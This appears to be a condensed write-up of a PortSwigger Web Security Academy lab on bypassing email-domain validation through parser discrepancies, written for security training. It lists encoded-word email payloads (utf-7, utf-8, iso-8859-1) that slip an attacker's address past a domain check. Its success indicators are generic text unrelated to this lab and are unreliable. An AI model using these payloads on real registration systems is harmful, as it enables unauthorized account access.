## Bypassing access controls using email address parsing discrepancies

**Category:** logic_flaw
**Difficulty:** Unknown

### Description
This lab validates email addresses to prevent attackers from registering addresses from unauthorized domains. There is a parser discrepancy in the validation logic and library used to parse email addresses.

### Solution Steps
1. Open the lab and click Register .
2. Attempt to register an account with the email foo@exploit-server.net .
3. Notice that the application blocks the request and displays an error message stating that the email domain must be ginandjuice.shop . This indicates the server enforces a domain check during registration.

### Key Payloads
- `carlos`
- `foo@exploit-server.net`
- `ginandjuice.shop`
- `=?iso-8859-1?q?=61=62=63?=foo@ginandjuice.shop`
- `abcfoo@ginandjuice.shop`
- `=?utf-8?q?=61=62=63?=foo@ginandjuice.shop`
- `=?utf-7?q?&AGEAYgBj-?=foo@ginandjuice.shop`
- `=?utf-7?q?attacker&AEA-[YOUR-EXPLOIT-SERVER_ID]&ACA-?=@ginandjuice.shop`
- `attacker@[YOUR-EXPLOIT-SERVER-ID] ?=@ginandjuice.shop`
- `@ginandjuice.shop`

### Indicators of Success
- Business logic bypassed or manipulated
- Workflow steps skipped or reordered
- Price/quantity manipulation successful
- Negative or extreme values accepted
- State machine or validation violated
---
*Source: PortSwigger Web Security Academy*
